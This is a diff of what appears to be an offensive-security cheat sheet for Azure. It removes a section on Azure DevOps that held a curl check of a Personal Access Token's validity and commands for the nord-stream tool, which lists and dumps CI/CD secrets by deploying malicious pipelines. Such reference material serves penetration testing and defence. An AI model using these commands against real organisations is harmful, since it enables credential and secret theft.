@@ -216,25 +216,6 @@ az webapp create-remote-connection --subscription <SUBSCRIPTION-ID> --resource-g
     ```
 
 
-## Azure Devops
-
-* Verify the validity of an Azure Personal Access Token (PAT)
-    ```ps1
-    PAT=""
-    organization=""
-    curl -u :${PAT} https://dev.azure.com/${organization}/_apis/build-release/builds
-    ```
-
-* [synacktiv/nord-stream](https://github.com/synacktiv/nord-stream) - Nord Stream is a tool that allows you to extract secrets stored inside CI/CD environments by deploying malicious pipelines. It currently supports Azure DevOps, GitHub and GitLab.
-    ```ps1
-    # List all secrets from all projects
-    $ nord-stream.py devops --token "$PAT" --org myorg --list-secrets
-
-    # Dump all secrets from all projects
-    $ nord-stream.py devops --token "$PAT" --org myorg
-    ```
-
-
 ## Microsoft Intune
 
 * LAPS
